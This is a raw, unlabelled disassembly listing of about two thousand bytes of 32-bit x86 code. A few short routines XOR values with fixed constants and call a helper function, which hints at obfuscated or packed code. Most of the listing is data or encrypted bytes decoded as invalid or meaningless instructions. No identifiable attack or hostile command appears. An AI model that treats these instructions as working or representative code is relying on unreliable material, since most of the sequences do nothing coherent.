  406dea:	cmp    ebp,eax
  406dec:	sbb    ebx,DWORD PTR [esi-0x5d26680]
  406df2:	popa   
  406df3:	mov    al,0xf3
  406df5:	ds das 
  406df7:	pop    ds
  406df8:	lea    edx,[ecx-0x32c31a5]
  406dfe:	sbb    DWORD PTR [eax],edi
  406e00:	fdivr  QWORD PTR [ebp+0x7d]
  406e03:	shr    ebp,cl
  406e05:	jmp    0x2d4b:0x17bd214b
  406e0c:	jnp    0x406dc7
  406e0e:	jno    0x406e5e
  406e10:	rcr    BYTE PTR [ebx+ebp*8-0x53],0xf1
  406e15:	adc    BYTE PTR [esi+0x7860a99],bl
  406e1b:	xor    BYTE PTR [ebx-0x2e528b25],bl
  406e21:	jno    0x406db0
  406e23:	cdq    
  406e24:	add    BYTE PTR [edx-0xfd1cf17],0xb8
  406e2b:	jg     0x406e0a
  406e2d:	hlt    
  406e2e:	push   ecx
  406e2f:	pop    edx
  406e30:	sbb    bl,cl
  406e32:	add    BYTE PTR [eax+0x4593d124],bl
  406e38:	jb     0x406dba
  406e3a:	jg     0x406e93
  406e3c:	xchg   edx,eax
  406e3d:	sub    DWORD PTR [ebx+0x20],ebp
  406e40:	cmp    BYTE PTR [esi-0x3f],al
  406e43:	int3   
  406e44:	icebp  
  406e45:	mov    edx,0x69bff454
  406e4a:	sar    esi,1
  406e4c:	dec    edi
  406e4d:	mov    DWORD PTR [ebp+0x10],edx
  406e50:	mov    edx,DWORD PTR [esi+0x4]
  406e53:	xor    eax,0xcb79b576
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [esp+edx*4-0x411c24c5]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0x94317dbe
  406f18:	fisub  WORD PTR [esi-0x5d]
  406f1b:	jo     0x406f9a
  406f1d:	jb     0x406ee0
  406f1f:	sub    al,0x8a
  406f21:	jle    0x406f17
  406f23:	sub    BYTE PTR [ecx-0x1f868ea3],ah
  406f29:	push   edx
  406f2a:	test   al,0x6f
  406f2c:	mov    gs,WORD PTR [esi+edi*4]
  406f2f:	(bad)  
  406f30:	cdq    
  406f31:	jbe    0x406f6e
  406f33:	push   es
  406f34:	ins    BYTE PTR es:[edi],dx
  406f35:	into   
  406f36:	enter  0xf831,0x41
  406f3a:	fld    DWORD PTR [eax-0x492f316a]
  406f40:	(bad)  
  406f42:	pop    ecx
  406f43:	and    edi,DWORD PTR [edx-0x7337069a]
  406f49:	cmp    eax,0x49fd9ada
  406f4e:	(bad)  
  406f4f:	jno    0x406f3c
  406f51:	and    al,0xa8
  406f53:	pop    ebx
  406f54:	adc    dh,dh
  406f56:	rcl    DWORD PTR [esi-0x4332c97b],1
  406f5c:	push   cs
  406f5d:	jge    0x406eeb
  406f5f:	je     0x406f93
  406f61:	ficomp DWORD PTR [ecx+0x9fd2b40]
  406f67:	clc    
  406f68:	fsub   QWORD PTR [eax+0x0]
  406f6b:	stos   BYTE PTR es:[edi],al
  406f6c:	add    eax,0xf82d5c67
  406f71:	pop    esp
  406f72:	dec    ebp
  406f73:	int3   
  406f74:	ins    DWORD PTR es:[edi],dx
  406f75:	sub    al,0xb1
  406f77:	sbb    BYTE PTR [edx-0x3e76a05d],bh
  406f7d:	(bad)
  406f80:	cld    
  406f81:	or     dh,BYTE PTR [edx]
  406f83:	push   edx
  406f84:	mov    eax,ds:0x535ff1f4
  406f89:	cwde   
  406f8a:	lock push esp
  406f8c:	repz dec edx
  406f8e:	dec    ecx
  406f8f:	xor    eax,0xb057aca2
  406f94:	fs jp  0x406f1f
  406f97:	loop   0x406f67
  406f99:	xchg   BYTE PTR [ebp+0x20],bh
  406f9c:	adc    BYTE PTR [ecx+0x4b],bh
  406f9f:	xor    ch,BYTE PTR [ecx+0x17]
  406fa2:	mov    cl,0x5f
  406fa4:	dec    esi
  406fa5:	rol    BYTE PTR [edx],cl
  406fa7:	call   0x9b5a89ab
  406fac:	outs   dx,BYTE PTR ds:[esi]
  406fad:	jmp    0x33082376
  406fb2:	pop    ecx
  406fb3:	xchg   ebx,eax
  406fb4:	or     al,dl
  406fb6:	jecxz  0x406f84
  406fb8:	ja     0x406ff7
  406fba:	mov    al,BYTE PTR [ebp-0x5d61879f]
  406fc0:	xchg   edi,eax
  406fc1:	mov    ebx,0xaeef396c
  406fc6:	repnz retf 0xc86d
  406fca:	(bad)  
  406fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fcd:	mov    edi,0x9e4dafe7
  406fd2:	adc    al,0x95
  406fd4:	adc    edi,DWORD PTR [edx-0x6a]
  406fd7:	mov    ch,0x86
  406fd9:	sbb    eax,0x3426c031
  406fde:	xor    al,dl
  406fe0:	pop    ecx
  406fe1:	xchg   ecx,eax
  406fe2:	push   eax
  406fe3:	mov    edi,0x6d07de71
  406fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fe9:	out    0x8f,al
  406feb:	sub    BYTE PTR [ebx],0xdd
  406fee:	imul   esi,DWORD PTR [ebx+0x4a],0xc9abed50
  406ff5:	mov    DWORD PTR [ecx+0x15c45ec7],ecx
  406ffb:	inc    ebx
  406ffc:	(bad)  
  406ffd:	dec    edx
  406ffe:	cmp    edx,esi
  407000:	pop    esi
  407001:	daa    
  407002:	jle    0x40707e
  407004:	mov    ah,0x30
  407006:	ret    0xc8f1
  407009:	cmp    dl,BYTE PTR [ebx-0x27]
  40700c:	push   es
  40700d:	inc    edx
  40700e:	cmp    DWORD PTR [ebx+0x7c97c668],ecx
  407014:	lahf   
  407015:	retf   
  407016:	ins    DWORD PTR es:[edi],dx
  407017:	or     al,0xc5
  407019:	and    BYTE PTR [ebp-0x49],0xa
  40701d:	mov    bh,0x15
  40701f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407020:	xchg   eax,esp
  407022:	into   
  407023:	in     al,0x9d
  407025:	cs cli 
  407027:	xchg   esi,eax
  407028:	xchg   esp,eax
  407029:	imul   ebp,DWORD PTR ds:0x884d7bce,0xba34eda6
  407033:	or     DWORD PTR [ebx-0x5d],ecx
  407036:	aaa    
  407037:	lds    ebx,FWORD PTR [ebx]
  407039:	and    DWORD PTR [ecx],esp
  40703b:	mov    esi,0xa8245ecd
  407040:	push   cx
  407042:	add    al,0xa0
  407044:	sub    eax,0x4ef950b2
  407049:	fidivr DWORD PTR ds:0xe8446b5d
  40704f:	std    
  407050:	dec    esp
  407051:	sub    BYTE PTR [ecx-0x5f],dh
  407054:	mov    ah,0xb7
  407056:	xor    al,0xea
  407058:	adc    dh,BYTE PTR gs:[edi-0x5f]
  40705c:	lods   al,BYTE PTR ds:[esi]
  40705d:	leave  
  40705e:	dec    ebx
  407060:	lahf   
  407061:	retf   
  407062:	call   0xbfcf3eba
  407067:	mov    WORD PTR [ecx],es
  407069:	adc    DWORD PTR [edi-0xc],esi
  40706c:	inc    edi
  40706d:	mov    bl,0x55
  40706f:	mov    dl,0xad
  407071:	scas   al,BYTE PTR es:[edi]
  407072:	cld    
  407073:	xchg   edi,eax
  407074:	xchg   esp,eax
  407075:	mov    ah,BYTE PTR [esi+edx*2-0x68]
  407079:	lods   eax,DWORD PTR ds:[esi]
  40707a:	push   ds
  40707b:	pop    es
  40707c:	mov    bh,0xd0
  40707e:	mov    ch,0x51
  407080:	sub    eax,0x918a4f20
  407085:	mov    ecx,0x3fda5eac
  40708a:	data16 and BYTE PTR [edi+0x415f24fd],ah
  407091:	jns    0x407025
  407093:	std    
  407094:	mov    cl,0x7f
  407096:	pop    ds
  407097:	sbb    al,0xd1
  407099:	inc    edi
  40709b:	inc    edi
  40709c:	outs   dx,BYTE PTR ds:[esi]
  40709d:	popf   
  40709e:	jae    0x407058
  4070a0:	scas   al,BYTE PTR es:[edi]
  4070a1:	icebp  
  4070a2:	stos   BYTE PTR es:[edi],al
  4070a3:	lahf   
  4070a4:	pop    eax
  4070a5:	sbb    DWORD PTR [esi],esp
  4070a7:	(bad)  
  4070a8:	xor    esp,DWORD PTR [ecx-0x25471d88]
  4070ae:	pop    edi
  4070af:	cmc    
  4070b0:	sbb    DWORD PTR [ecx+0x68],ecx
  4070b3:	pop    esi
  4070b4:	jmp    0x407045
  4070b6:	inc    edi
  4070b7:	pop    es
  4070b8:	mov    BYTE PTR [ecx+0x62],ah
  4070bb:	fldcw  WORD PTR [edi-0x3448b60b]
  4070c1:	jnp    0x407067
  4070c3:	popf   
  4070c4:	adc    eax,DWORD PTR [eax-0x35]
  4070c7:	jo     0x4070f0
  4070c9:	idiv   DWORD PTR [edi-0x75878805]
  4070cf:	(bad)  [esi-0x4e0e39c6]
  4070d5:	xchg   esi,eax
  4070d6:	popf   
  4070d7:	rcr    DWORD PTR [esi+0x10],0x7
  4070db:	das    
  4070dc:	aam    0xcd
  4070de:	push   ebp
  4070df:	in     al,dx
  4070e0:	and    al,0x93
  4070e2:	addr16 mov edx,0x2c93efca
  4070e8:	imul   ecx,DWORD PTR [esi-0x4c30d810],0xf64e0c4b
  4070f2:	test   DWORD PTR [eax+0xcafc204],ebx
  4070f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070f9:	and    al,0x8c
  4070fb:	push   esp
  4070fc:	sbb    eax,0xaf6247a9
  407101:	(bad)  
  407102:	add    ebp,ebx
  407104:	and    esi,eax
  407106:	retf   
  407107:	fwait
  407108:	leave  
  407109:	sub    DWORD PTR [eax],esi
  40710b:	cmp    eax,0x9e9d413a
  407110:	inc    ecx
  407111:	in     eax,0x10
  407113:	not    BYTE PTR [ebp-0x61]
  407116:	sub    DWORD PTR [edi-0x1b],ebx
  407119:	in     al,dx
  40711a:	adc    eax,0xb0bcaf00
  40711f:	inc    edx
  407120:	push   0x29cde8df
  407125:	mov    esi,0x2c06ce1f
  40712a:	and    eax,0xe281246d
  40712f:	push   eax
  407130:	(bad)  
  407131:	sub    bl,cl
  407133:	out    0x55,al
  407135:	popa   
  407136:	sbb    edx,DWORD PTR [edx]
  407138:	and    ebx,DWORD PTR [esi+0x7b6589b1]
  40713e:	scas   al,BYTE PTR es:[edi]
  40713f:	inc    esi
  407140:	jns    0x4071aa
  407142:	in     eax,dx
  407143:	pop    eax
  407144:	aam    0x2b
  407146:	enter  0xaaa3,0xea
  40714a:	add    dl,bh
  40714c:	sahf   
  40714d:	add    eax,0x92296ce9
  407152:	inc    ebx
  407153:	rcr    ch,cl
  407155:	sub    bh,BYTE PTR [ebx+0x7f7a3494]
  40715b:	lea    esi,[ecx+0x50]
  40715e:	rol    dl,1
  407160:	repz xchg edx,eax
  407162:	mov    esp,0x44b7a4a7
  407167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407168:	add    eax,0x539d720c
  40716d:	(bad)  
  40716e:	rcr    DWORD PTR [eax+0x2ad1a7ad],0x47
  407175:	or     eax,0x5461fcc3
  40717a:	test   DWORD PTR [edi],edi
  40717c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40717d:	inc    ecx
  40717e:	cld    
  40717f:	pop    edi
  407180:	dec    ecx
  407181:	les    eax,FWORD PTR [ebx+ebp*4-0x1977b82b]
  407188:	iret   
  407189:	mov    dl,0x9d
  40718b:	sti    
  40718c:	mov    ds:0x7970b90c,eax
  407191:	and    esp,DWORD PTR [ebx+edx*1-0x63]
  407195:	cmp    al,0x68
  407197:	xchg   edi,eax
  407198:	out    0x8a,al
  40719a:	imul   esi,ebx,0xe3dec5ef
  4071a0:	sub    BYTE PTR [eax-0x2a],ch
  4071a3:	ja     0x407193
  4071a5:	jmp    0xfdc57b96
  4071aa:	mov    eax,ds:0x5524a86b
  4071af:	cwde   
  4071b0:	sar    DWORD PTR [ebx+0x77757209],0x13
  4071b7:	imul   esp,DWORD PTR [edi],0xffffffab
  4071ba:	jb     0x4071d0
  4071bc:	repnz push ebp
  4071be:	jns    0x407216
  4071c0:	inc    ebx
  4071c1:	sti    
  4071c2:	leave  
  4071c3:	push   ss
  4071c4:	cmp    ebp,DWORD PTR [edx+0x5ac1e001]
  4071ca:	sti    
  4071cb:	fstp   DWORD PTR ds:[edi+ebx*2-0x3]
  4071d0:	xchg   ebx,eax
  4071d1:	xlat   BYTE PTR ds:[ebx]
  4071d2:	gs push ebx
  4071d4:	xchg   DWORD PTR [eax+ebx*2-0x7f4f79c6],ebp
  4071db:	xor    DWORD PTR [ebp+0x4],0x5b
  4071df:	sbb    eax,0x998009c8
  4071e4:	jbe    0x40725b
  4071e6:	pushf  
  4071e7:	push   ecx
  4071e8:	lods   eax,DWORD PTR ds:[esi]
  4071e9:	xor    dl,BYTE PTR es:[ebx+ebp*1+0x3]
  4071ee:	addr16 mov esi,0x66897859
  4071f4:	aad    0x9b
  4071f6:	aaa    
  4071f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f8:	lods   al,BYTE PTR ds:[esi]
  4071f9:	fldz   
  4071fb:	push   edx
  4071fc:	out    0x3b,al
  4071fe:	or     DWORD PTR [edx],esp
  407200:	or     eax,0xe7bb73a5
  407205:	dec    edx
  407206:	mov    esp,0x4d1fbb07
  40720b:	outs   dx,BYTE PTR ds:[esi]
  40720c:	ror    DWORD PTR [ebp+0x401d5093],1
  407212:	cmp    esp,eax
  407214:	mov    ds:0x8918873b,eax
  407219:	in     eax,dx
  40721a:	mov    dh,0xc7
  40721c:	das    
  40721d:	setge  al
  407220:	adc    esi,ebx
  407222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407223:	push   ebx
  407224:	xchg   esi,eax
  407225:	xchg   BYTE PTR [edx-0x49618f87],dl
  40722b:	in     eax,0xc0
  40722d:	loope  0x407270
  40722f:	and    dl,BYTE PTR [ecx-0x62d1f985]
  407235:	sti    
  407236:	into   
  407237:	mov    dh,0xc8
  407239:	out    0xb6,al
  40723b:	mov    eax,0x6d34aefe
  407240:	test   DWORD PTR [edi-0x1a],ecx
  407243:	pop    ecx
  407244:	sub    al,0x80
  407246:	sbb    BYTE PTR [ecx+0x35535763],bh
  40724c:	mov    ch,0xf5
  40724e:	jno    0x40722e
  407250:	and    BYTE PTR ds:0xbb2f82f1,0xe9
  407257:	mov    ebp,0x14d4a290
  40725c:	xchg   ecx,eax
  40725d:	ret    
  40725e:	pop    es
  40725f:	lods   eax,DWORD PTR ds:[esi]
  407260:	cmp    esp,DWORD PTR [edi-0x499c95ff]
  407266:	popf   
  407267:	sbb    edi,0xdb97fbf8
  40726d:	push   esi
  40726e:	cld    
  40726f:	xor    al,BYTE PTR [esp+ecx*2]
  407272:	mov    eax,ds:0xac722d85
  407277:	dec    ebp
  407278:	addr16 xchg esp,eax
  40727a:	rcl    esp,cl
  40727c:	jae    0x407273
  40727e:	bound  esp,QWORD PTR [ebx+0x7f]
  407281:	xor    DWORD PTR [ebp+eiz*1-0x15],eax
  407285:	cmp    al,0x95
  407287:	lock jo 0x407244
  40728a:	pop    edx
  40728b:	push   edx
  40728c:	scas   al,BYTE PTR es:[edi]
  40728d:	xor    ebp,DWORD PTR [edi-0x69]
  407290:	pop    esp
  407291:	repnz mov ds,WORD PTR [edx+edx*2+0x33bc0802]
  407299:	stc    
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	fld    QWORD PTR [edi-0x4261e179]
  4072c0:	dec    edi
  4072c1:	mov    esi,0xbec4bdbe
  4072c6:	mov    esi,0x8b4cd22f
  4072cb:	into   
  4072cc:	out    dx,eax
  4072cd:	inc    ebx
  4072ce:	jp     0x40732f
  4072d0:	retf   0xba6a
  4072d3:	push   ebx
  4072d4:	xor    BYTE PTR [ecx+0x294754f],0x34
  4072db:	inc    ebx
  4072dc:	inc    ebx
  4072dd:	mov    dh,0xc0
  4072df:	bound  esp,QWORD PTR [edi+ebp*8-0x42]
  4072e3:	or     eax,0xbcf831fc
  4072e8:	test   BYTE PTR [ebx],dh
  4072ea:	sbb    eax,0xe2695f9d
  4072ef:	push   es
  4072f0:	dec    edi
  4072f1:	sub    BYTE PTR [edx+0x22],dh
  4072f4:	(bad)  
  4072f5:	std    
  4072f6:	adc    DWORD PTR [edi+0x2ad4647b],esp
  4072fc:	cmp    bh,BYTE PTR ds:0xed8360b2
  407302:	(bad)  
  407303:	xchg   ebx,eax
  407304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407305:	les    edx,FWORD PTR [edx-0x778c8c4d]
  40730b:	xchg   esp,eax
  40730c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40730d:	xchg   esi,eax
  40730e:	(bad)  
  40730f:	js     0x40737f
  407311:	and    al,0x6d
  407313:	bound  edx,QWORD PTR [eax]
  407315:	mov    ecx,0xf440785b
  40731a:	push   0x5c
  40731c:	fs out 0x3e,al
  40731f:	test   bh,al
  407321:	(bad)  
  407322:	loopne 0x407322
  407324:	mov    eax,DWORD PTR [edi]
  407326:	jge    0x407394
  407328:	push   0x3bb254f
  40732d:	xlat   BYTE PTR ds:[ebx]
  40732e:	loope  0x407339
  407330:	(bad)  
  407331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407332:	jbe    0x4073a0
  407334:	push   ebx
  407335:	lea    ebp,ds:0x514e51b3
  40733b:	cmp    esi,DWORD PTR [edi-0x33f527e2]
  407341:	or     dl,bl
  407343:	aad    0xb2
  407345:	lods   eax,DWORD PTR ds:[esi]
  407346:	in     al,dx
  407347:	sub    cl,BYTE PTR [ebx+0x44b91f2a]
  40734d:	test   DWORD PTR [eax+0x2143f590],edx
  407353:	xchg   ebp,eax
  407354:	repz mov edx,0x865b649f
  40735a:	aaa    
  40735b:	or     ebx,DWORD PTR [edi-0x50]
  40735e:	cwde   
  40735f:	jmp    0x7afb:0x27fe020f
  407366:	jno    0x4073d6
  407368:	xchg   DWORD PTR [ebx],edx
  40736a:	ss inc esp
  40736c:	fcomp  QWORD PTR [ebx-0x25]
  40736f:	mov    bl,0xb7
  407371:	stos   BYTE PTR es:[edi],al
  407372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407373:	xchg   DWORD PTR [ebx],edx
  407375:	bound  esi,QWORD PTR [edi+eax*4+0x24]
  407379:	div    BYTE PTR es:[ebx+0x21]
  40737d:	pusha  
  40737e:	cmp    eax,0x328f9e03
  407383:	fld    DWORD PTR [esi+0x676d7c1c]
  407389:	or     BYTE PTR [ebx+ebx*4+0x1],dl
  40738d:	mov    ebx,0xd6a44051
  407392:	mov    esp,0x2177d827
  407397:	inc    edx
  407398:	(bad)  
  407399:	adc    ecx,eax
  40739b:	mov    eax,0x4f30e76f
  4073a0:	and    bh,BYTE PTR [ebp-0x1f]
  4073a3:	aam    0xe4
  4073a5:	js     0x40737f
  4073a7:	je     0x4073c3
  4073a9:	and    al,0x55
  4073ab:	push   edx
  4073ac:	inc    ebx
  4073ad:	in     eax,dx
  4073ae:	cmp    ecx,ebx
  4073b0:	(bad)  
  4073b2:	inc    ecx
  4073b3:	cmp    bh,al
  4073b5:	(bad)  
  4073b6:	cli    
  4073b7:	daa    
  4073b8:	jae    0x4073ee
  4073ba:	mov    ah,0x62
  4073bc:	sbb    DWORD PTR [edi+0x7a],eax
  4073bf:	push   es
  4073c0:	ror    DWORD PTR [edx+0xe],cl
  4073c3:	cdq    
  4073c4:	push   cs
  4073c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c6:	gs test eax,0x6308e73b
  4073cc:	push   esi
  4073cd:	and    ecx,DWORD PTR [ecx-0x4b]
  4073d0:	bnd jp 0x407360
  4073d3:	adc    esi,edi
  4073d5:	xchg   esp,eax
  4073d6:	mov    esi,DWORD PTR [eax+0x5b]
  4073d9:	std    
  4073da:	dec    esp
  4073db:	jge    0x407457
  4073dd:	test   BYTE PTR ds:0xca87c97d,0x66
  4073e4:	das    
  4073e5:	xchg   edi,eax
  4073e6:	cmp    DWORD PTR [edx],ecx
  4073e8:	inc    edx
  4073e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ea:	addr16 push ebp
  4073ec:	cmp    BYTE PTR [edi+0xa],bl
  4073ef:	popf   
  4073f0:	dec    sp
  4073f2:	mov    al,ds:0x3a7ddc24
  4073f7:	mov    al,ds:0x5991efd8
  4073fc:	mov    ebp,DWORD PTR [ecx+0x45]
  4073ff:	pop    ss
  407400:	add    eax,edi
  407402:	scas   al,BYTE PTR es:[edi]
  407403:	aaa    
  407404:	push   edx
  407405:	or     al,0xfc
  407407:	sar    DWORD PTR [edx-0x54],cl
  40740a:	(bad)  
  40740c:	and    esi,DWORD PTR [edx-0x22]
  40740f:	mov    eax,ds:0xc7121b4f
  407414:	cdq    
  407415:	sar    DWORD PTR [esi+0x5ef97e3c],1
  40741b:	inc    BYTE PTR [edi]
  40741d:	jge    0x4073e0
  40741f:	fs lock js 0x40741a
  407423:	mov    dh,ah
  407425:	cmp    ebx,ebx
  407427:	cmp    BYTE PTR [esi+edi*8],bh
  40742a:	mov    ebx,0x1d51b882
  40742f:	mov    bl,0x24
  407431:	mov    esp,0x844644c7
  407436:	jmp    FWORD PTR [ecx]
  407438:	jno    0x40745a
  40743a:	call   0x7b19:0x295c108c
  407441:	xchg   BYTE PTR [edx+0x267c018b],ah
  407447:	mov    bh,0xd0
  407449:	stos   BYTE PTR es:[edi],al
  40744a:	in     al,dx
  40744b:	sbb    dh,al
  40744d:	rcr    DWORD PTR [edx-0x4c],0x3d
  407451:	push   ss
  407452:	adc    DWORD PTR [bx+di+0x27],esi
  407456:	mov    edx,0xd71e0cfa
  40745b:	mov    al,ds:0xc490032e
  407460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407461:	mov    gs,WORD PTR [edi-0x62]
  407464:	(bad)  
  407465:	dec    eax
  407466:	sub    ch,ah
  407468:	xchg   ebp,eax
  407469:	pop    ebp
  40746a:	gs mov dh,0x33
  40746d:	xchg   ecx,eax
  40746e:	inc    esp
  40746f:	dec    edx
  407470:	std    
  407471:	iret   
  407472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407473:	pop    eax
  407474:	rol    DWORD PTR [edx+edi*8],1
  407477:	xchg   esp,eax
  407478:	mov    BYTE PTR [ebx+ebx*2+0x61],bh
  40747c:	mov    dh,0x3d
  40747e:	sub    al,0x3
  407480:	cmp    DWORD PTR ds:0xf27c293f,edx
  407486:	sub    al,BYTE PTR [ebx+0x2ee7e91d]
  40748c:	inc    esi
  40748d:	pop    eax
  40748e:	enter  0x966a,0x98
  407492:	mov    eax,0x8ba5b4e6
  407497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407498:	jecxz  0x407456
  40749a:	add    al,0x8b
  40749c:	popa   
  40749d:	mov    ebp,0xe7dcd2e4
  4074a2:	fist   WORD PTR ds:0x68724918
  4074a8:	mov    bl,BYTE PTR [ecx+0x0]
  4074ab:	ja     0x4074a8
  4074ad:	icebp  
  4074ae:	xchg   ebp,eax
  4074af:	or     al,0xc4
  4074b1:	xchg   BYTE PTR [ebx+0x27],bh
  4074b4:	arpl   bp,si
  4074b6:	iret   
  4074b7:	cmp    dh,ah
  4074b9:	fwait
  4074ba:	sub    BYTE PTR [ecx+0x60f77362],0xb7
  4074c1:	retf   0xb264
  4074c4:	cmp    al,0x68
  4074c6:	and    ch,cl
  4074c8:	in     eax,dx
  4074c9:	jmp    0x8934:0x77435242
  4074d0:	(bad)  [ecx+0x2d06131b]
  4074d6:	dec    edx
  4074d7:	cs push es
  4074d9:	mov    ebx,0x5ca73686
  4074de:	push   edi
  4074df:	dec    ecx
  4074e0:	fisttp DWORD PTR [edx-0x7a6db803]
  4074e6:	icebp  
  4074e7:	jne    0x4074ff
  4074e9:	jmp    0x4074d8
  4074eb:	push   esp
  4074ec:	stc    
  4074ed:	nop
  4074ee:	mov    ds:0xe0345d29,eax
  4074f3:	in     eax,0x99
  4074f5:	mov    bh,0xa8
  4074f7:	dec    esi
  4074f8:	dec    eax
  4074f9:	pop    ss
  4074fa:	and    al,0xe9
  4074fc:	call   0xf8685202
  407501:	stos   DWORD PTR es:[edi],eax
  407502:	xchg   ebx,eax
  407503:	dec    ebx
  407504:	pop    edi
  407505:	pop    esi
  407506:	cmc    
  407507:	adc    al,0xd7
  407509:	pop    edx
  40750a:	adc    al,0x3
  40750c:	dec    ebx
  40750d:	xchg   ebx,eax
  40750e:	das    
  40750f:	jge    0x40751c
  407511:	nop
  407512:	and    DWORD PTR [eax+0x7c],0xffffffb1
  407516:	test   DWORD PTR [ecx+0x70],eax
  407519:	sbb    bl,ah
  40751b:	adc    cl,BYTE PTR [esi+0x2f]
  40751e:	mov    edx,0xa011ab85
  407523:	popf   
  407524:	pop    eax
  407525:	jmp    0x737a:0x2debe70b
  40752c:	shr    BYTE PTR [ecx+0xe],1
  40752f:	loopne 0x407528
  407531:	jmp    0x341d0faf
  407536:	adc    BYTE PTR [ebp-0x7c440186],bh
  40753c:	jae    0x4074f0
  40753e:	(bad)  
  40753f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407540:	jae    0x40753e
  407542:	test   al,0xb9
  407544:	jns    0x4075b9
  407546:	mov    al,ds:0x50cb26f
  40754b:	xchg   edx,eax
  40754c:	or     BYTE PTR [edi-0x69],cl
  40754f:	repnz ss inc ecx
  407552:	push   ebx
  407553:	mov    bh,0x5c
  407555:	push   eax
  407556:	fsubrp st(4),st
  407558:	pop    edi
  407559:	mov    ebx,0x49209506
  40755e:	pusha  
  40755f:	pop    ds
  407560:	outs   dx,BYTE PTR ds:[esi]
  407561:	sar    eax,1
  407563:	jecxz  0x4075d7
  407565:	dec    esp
  407566:	stos   BYTE PTR es:[edi],al
  407567:	jle    0x40751a
  407569:	out    0x8f,eax
  40756b:	or     eax,0xa9ab91ba
  407570:	push   edx
  407571:	div    DWORD PTR [eax+0x20]
  407574:	fbld   TBYTE PTR [ebx+edi*8+0x62]
  407578:	(bad)  
  407579:	cs jmp 0x40752a
  40757c:	jp     0x40752b
  40757e:	jg     0x40753f
  407580:	mov    eax,0xb11ff391
  407585:	leave  
  407586:	push   edx
  407587:	fadd   DWORD PTR [ebp-0x6acca5af]
  40758d:	jnp    0x40751b
  40758f:	or     bh,BYTE PTR [eax-0x52ea34a8]
  407595:	push   ebx
  407596:	push   esp
  407597:	std    
  407598:	push   eax
  407599:	pop    edi
  40759a:	std    
  40759b:	push   ecx
  40759c:	iret   
  40759d:	xchg   esp,eax
  40759e:	push   edi
  40759f:	cli    
  4075a0:	adc    ecx,DWORD PTR [ebx-0x4b]
  4075a3:	imul   ebp,DWORD PTR [edi+0x7732b2ca],0x98754555
  4075ad:	retf   0x7fd2
  4075b0:	dec    esp
  4075b1:	rcl    BYTE PTR [edx+eiz*8+0x314e462e],1
  4075b8:	and    BYTE PTR ds:0x7580d2fb,ch
  4075be:	or     dl,BYTE PTR [esi]
  4075c0:	dec    esp
  4075c1:	jae    0x407556
